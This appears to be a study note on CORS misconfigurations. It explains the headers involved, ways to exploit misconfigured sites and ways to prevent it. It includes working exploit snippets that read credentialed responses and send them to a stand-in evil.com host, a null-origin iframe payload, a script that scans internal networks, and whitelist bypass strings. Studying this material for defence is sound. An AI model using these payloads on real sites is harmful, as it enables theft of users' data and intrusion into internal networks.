## CORS (Cross-origin resource sharing)

- **What it is**
  - A browser mechanism that enables controlled access to resources located outside of a given domain
  - Extends and adds flexibility to the same-origin policy (SOP)
  - Uses HTTP headers to define which origins can access resources
  - Creates potential for cross-domain attacks if misconfigured
  - Not a protection against cross-origin attacks such as CSRF

- **Key concepts**

  - **Same-origin policy (SOP)**
    - A restrictive cross-origin specification that limits website interactions with external resources
    - Generally allows a domain to issue requests to other domains but not access the responses
    - Considers origins with the same protocol, domain, and port to be "same origin"
    - Example: `https://example.com` can't access resources from `https://evil.com` or even `https://sub.example.com`
  
  - **CORS headers**
    - `Access-Control-Allow-Origin` (ACAO): Specifies which origins can access the resource
      - Examples: `Access-Control-Allow-Origin: https://trusted-site.com` or `Access-Control-Allow-Origin: *`
    - `Access-Control-Allow-Credentials` (ACAC): Indicates if the request can include credentials (cookies, auth headers)
      - When set to `true`, allows authenticated requests across origins
    - `Access-Control-Allow-Methods`: Specifies allowed HTTP methods for cross-origin requests
    - `Access-Control-Allow-Headers`: Lists headers that can be used in the cross-origin request
    - `Access-Control-Expose-Headers`: Lists headers that browsers are allowed to access
  
  - **CORS request types**
    - Simple requests: Don't trigger preflight, must use methods like GET, POST, or HEAD
    - Preflighted requests: Browser sends OPTIONS request first to check if the actual request is allowed
    - Requests with credentials: Require explicit permission from the server via ACAO and ACAC headers

- **How to identify CORS misconfigurations**
  - Check for overly permissive CORS headers in responses
  - Look for dynamic reflection of the Origin header in ACAO responses
  - Test for whitelisting issues by sending various origin values
  - Examine trust relationships between domains
  - Tools for testing:
    - Browser Developer Tools (Network tab)
    - Burp Suite (Repeater for manual testing, Scanner for automated detection)
    - CORS testing scripts and extensions

- **Common CORS vulnerabilities and exploitation techniques**

  - **Server-generated ACAO header from client-specified Origin**
    - Vulnerability: Server reflects any Origin header value in the ACAO response header
    - Exploitation:
      - Send a request with malicious origin: `Origin: https://evil.com`
      - Server responds with: `Access-Control-Allow-Origin: https://evil.com`
      - Use JavaScript to make cross-origin requests and read sensitive data
    - Example exploit code:
      ```javascript
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
        location='//evil.com/log?key='+this.responseText;
      };
      ```
    - Requirements for exploit:
      - Victim must visit attacker's website
      - Target site must reflect arbitrary origins
      - Target site must set `Access-Control-Allow-Credentials: true`
      - Sensitive information must be included in responses

  - **Errors parsing Origin headers (misconfigured whitelists)**
    - Vulnerability: Improper implementation of origin whitelists using prefix/suffix matching
    - Exploitation techniques:
      - Subdomain bypass: If `normal-website.com` is allowed, try `normal-website.com.evil.com`
      - Path confusion: If `https://trusted.com` is allowed, try `https://trusted.com.evil.com`
      - Incorrect regex: If matching `example\.com$`, try `example.com.attacker.com`
      - Protocol confusion: If `https://example.com` is allowed, try `http://example.com`
      - Additional dots: If `example.com` is allowed, try `example.com.`
      - Port manipulation: If `example.com` is allowed, try `example.com:arbitrary-port`
      - URL encoding: Try various encodings of allowed domains
    - Example test cases:
      - For whitelist containing `trusted-website.com`:
        - Try `attackertrusted-website.com`
        - Try `trusted-website.com.attacker.com`
        - Try `trusted-website.comevilextra`

  - **Whitelisted null origin value**
    - Vulnerability: Server accepts and whitelists the special `null` origin value
    - Exploitation:
      - Generate requests with `Origin: null` header
      - Use sandboxed iframe, data URI, or file protocol to create null origin context
    - Example exploit using sandboxed iframe:
      ```html
      <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
        location='https://evil.com/log?key='+this.responseText;
      };
      </script>"></iframe>
      ```
    - Ways to generate null origin:
      - `<iframe sandbox="allow-scripts" src="data:text/html,<script>/*exploit code*/</script>">`
      - Access via `file:///` protocol
      - Data URLs in some browsers
      - Serialized data in some contexts

  - **Exploiting XSS via CORS trust relationships**
    - Vulnerability: Trusted subdomain with XSS vulnerability + CORS trust relationship
    - Attack chain:
      1. Find XSS vulnerability on a subdomain that is trusted by the main site
      2. Main site sets `Access-Control-Allow-Origin: https://vulnerable-subdomain.com`
      3. Exploit XSS to execute JavaScript that makes CORS requests to the main site
      4. Access and exfiltrate sensitive data from the main site
    - Example:
      - Vulnerable site sets: `Access-Control-Allow-Origin: https://dev.example.com`
      - Attacker finds XSS on dev.example.com
      - Attacker creates URL: `https://dev.example.com/?xss=<script>/* CORS exploit */</script>`
      - When victim visits, attacker's code accesses data from the main example.com site

  - **Breaking TLS with poorly configured CORS**
    - Vulnerability: HTTPS site whitelists an HTTP origin in CORS policy
    - Attack steps:
      1. Victim makes any plain HTTP request
      2. Attacker intercepts and redirects to HTTP trusted origin
      3. Attacker intercepts that request and returns spoofed response with CORS request to HTTPS site
      4. Victim's browser makes CORS request including the HTTP origin
      5. HTTPS site allows the request due to whitelist and returns sensitive data
      6. Attacker's spoofed page reads and exfiltrates the data
    - Example scenario:
      - Secure site sets: `Access-Control-Allow-Origin: http://trusted-subdomain.example.com`
      - Attacker performs MITM attack to exploit the HTTP protocol in the trusted origin

  - **Attacking internal networks via CORS without credentials**
    - Vulnerability: Internal sites set `Access-Control-Allow-Origin: *` without requiring credentials
    - Exploitation technique:
      - Create public website that makes CORS requests to internal IP ranges
      - When internal users visit the public site, their browsers make requests to internal sites
      - Even without credentials, can map internal networks, access non-authenticated content, exploit vulnerabilities
    - Example reconnaissance script:
      ```javascript
      // Scan internal network range
      for (let i = 1; i < 256; i++) {
        fetch(`http://192.168.0.${i}/`)
          .then(response => {
            if (response.ok) {
              // Log discovered internal server
              sendToAttacker('http://192.168.0.' + i + ' exists');
            }
          })
          .catch(err => {
            // Handle errors or timeouts
          });
      }
      ```

  - **CORS misconfiguration on APIs**
    - Vulnerability: APIs with overly permissive CORS settings
    - Exploitation:
      - Test API endpoints with cross-origin requests
      - Look for sensitive data exposure, auth bypass, or administrative features
    - Common issues with APIs:
      - Setting `Access-Control-Allow-Origin: *` for convenience
      - Allowing credentials with loosely configured origins
      - Not validating the Origin header properly

- **Advanced CORS exploitation techniques**

  - **Combining CORS with other vulnerabilities**
    - CORS + CSRF: Bypass SameSite cookies and other CSRF protections
    - CORS + open redirect: Chain redirects to exploit trust relationships
    - CORS + client-side template injection: Execute JavaScript in trusted context
  
  - **Bypassing CORS preflight checks**
    - Manipulate requests to fit "simple request" criteria (avoid preflight)
    - Test for inconsistencies between preflight response and actual request handling
    - Look for flaws in preflight caching mechanisms

  - **CORS timing attacks**
    - Use timing differences in responses to infer information about protected resources
    - Script error analysis: Different error types can leak information about existence of resources

- **Prevention and mitigation**

  - **Proper configuration of cross-origin requests**
    - Implement a strict whitelist of trusted origins
    - Avoid dynamically reflecting origins without validation
    - Validate origins against a predefined list
    - Use exact string matching rather than regex or substring matching
  
  - **Handling of credentials**
    - Only allow credentials for trusted and necessary origins
    - Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
    - Consider alternatives like CSRF tokens for cross-origin write operations
  
  - **Avoid whitelisting null**
    - Never allow the null origin in production environments
    - If needed for development, restrict to non-production environments
  
  - **Secure internal networks**
    - Internal resources should validate origins strictly
    - Avoid wildcards (`*`) in internal network CORS configurations
    - Use additional authentication for sensitive operations
  
  - **Use appropriate security headers**
    - Implement Content-Security-Policy (CSP) alongside CORS
    - Consider using Subresource Integrity (SRI) for external scripts
    - Apply proper X-Content-Type-Options and X-Frame-Options headers
  
  - **Development best practices**
    - Treat CORS as a last resort; use alternative approaches when possible
    - Keep CORS configurations as restrictive as possible
    - Test CORS settings with automated and manual security tools
    - Remember that CORS is not a security mechanism but a relaxation of security

  - **CORS is not a substitute for server-side security**
    - Always maintain proper authentication and authorization server-side
    - Never rely on CORS alone to protect sensitive resources
    - Implement additional security layers (IP restrictions, tokens, etc.)
    - Apply the principle of least privilege when configuring CORS
